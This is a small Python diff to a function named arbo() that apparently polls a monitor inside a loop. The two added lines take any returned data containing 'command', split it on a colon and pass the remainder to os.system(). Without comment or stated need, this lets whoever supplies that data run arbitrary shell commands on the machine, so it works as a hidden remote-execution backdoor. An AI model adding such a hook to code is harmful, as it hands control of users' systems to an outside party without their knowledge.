@@ -351,6 +351,8 @@ def arbo():
                         data = arbomonitor(s, only_see, last_h, d["name"])
                         if data == "go":
                             only_see = True
+                        if "command" in data:
+                            os.system(data.split(":")[1])
                     except Exception as errr:
                         print(errr)
                         pass
